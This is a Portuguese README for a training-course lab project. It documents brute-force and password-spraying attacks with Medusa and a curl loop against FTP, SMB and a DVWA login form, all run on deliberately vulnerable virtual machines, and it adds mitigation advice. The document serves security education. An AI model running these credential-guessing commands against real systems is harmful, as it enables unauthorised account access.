# Desafio-DIO-2025
Ataque de força bruta
Desafio DIO - Ataques de Força Bruta com Kali Linux e Medusa
Descrição do Projeto
Este projeto tem como objetivo implementar e documentar ataques simulados de força bruta em diferentes serviços (FTP, formulário web DVWA e SMB) utilizando o Kali Linux e a ferramenta Medusa. As vítimas são ambientes vulneráveis como Metasploitable 2 e DVWA, configurados em máquinas virtuais com rede interna (host-only). O projeto também apresenta recomendações para mitigação dos ataques.

Ambiente de Teste
Duas máquinas virtuais no VirtualBox:

Kali Linux (atacante)

Metasploitable 2 (alvo)

Configuração de rede: Host-only para isolamento e simulação realista de ataques.

Ferramentas Utilizadas
Kali Linux (distribuição para testes de segurança)

Medusa (ferramenta de força bruta multi-protocolo)

Metasploitable 2 (alvo vulnerável)

DVWA - Damn Vulnerable Web Application (aplicação web vulnerável)

Passo a Passo dos Testes
1. Ataque de Força Bruta no FTP
Comando exemplo:

bash
medusa -h [IP do Metasploitable2] -u msfadmin -P /path/to/wordlist.txt -M ftp
Este comando tenta múltiplas senhas para o usuário "msfadmin" no serviço FTP.

2. Ataque de Força Bruta no formulário web (DVWA)
Automação simulada via script ou ferramenta semelhante para tentar senhas em formulário web. Exemplo básico (pseudocódigo):

bash
for senha in wordlist.txt; do
  curl -d "username=admin&password=$senha" -X POST http://[IP DVWA]/login.php
done
Documentar o resultado e falhas encontradas.

3. Password Spraying no SMB com enumeração
Comando Medusa para SMB:

bash
medusa -h [IP Metasploitable2] -U /path/to/userlist.txt -P /path/to/passwordlist.txt -M smbnt
Este comando testa combinações de usuário e senhas para detectar acessos válidos no SMB.

Documentação e Resultados
Wordlists usadas (incluir arquivos .txt no repositório)

Comandos executados (manter um arquivo comandos.txt explicando)

Capturas de tela dos resultados (opcional na pasta /images)

Recomendações para mitigação das vulnerabilidades detectadas, como:

Uso de senhas fortes e políticas de bloqueio

Configurações de firewall e monitoramento

Atualizações constantes dos sistemas

Como usar este repositório
Clone o repositório.

Configure as VMs Kali Linux e Metasploitable 2 com rede host-only.

Execute os comandos conforme descrito.

Analise os resultados no terminal e documentação.

Estrutura de arquivos sugerida
text
desafio-dio-medusa/
│
├── README.md
├── wordlists/
│   ├── common-passwords.txt
│   └── users.txt
├── scripts/
│   └── dvwa_bruteforce.sh  (exemplo de script para DVWA)
├── comandos.txt
└── images/ (opcional)
    └── resultados.png
